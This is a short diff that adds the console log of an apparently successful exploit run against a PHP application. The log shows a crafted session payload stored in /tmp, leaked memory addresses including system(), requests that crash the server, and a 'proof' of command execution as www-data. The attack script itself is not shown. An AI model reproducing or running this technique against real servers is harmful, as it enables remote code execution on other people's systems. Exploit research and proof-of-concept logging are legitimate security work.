@@ -1,0 +1,14 @@
+[i] build store payload
+payload=65500 prefix=11 struct_payload_off=0x1fdd file_len=65537 alloc=65562
+V=0x7f886e26e100 R=0x7f886e26e180 S=0x7f886e26e200 CMD=0x7f886e26e300 system=0x7f886f0bf090
+[i] store
+[/store.php] status=200 body=b'STORED pid=1623 len=65500\n'
+65537 /tmp/sess_f2spure000000000000000000001
+PPPPPPPPPPPPPP";upload_progress_fk1|R:1;
+[i] A (fatal)
+[/index.php] status=500 body=b''
+[i] B (upload progress)
+[/index.php] status=502 body=b'<html>\r\n<head><title>502 Bad Gateway</title></head>\r\n<body>\r\n<center><h1>502 Bad Gateway</h1></center>\r\n<hr><center>ngin'
+[i] proof:
+-rw-r--r-- 1 www-data www-data 54 Oct 22 14:56 /tmp/f2s_pwn
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
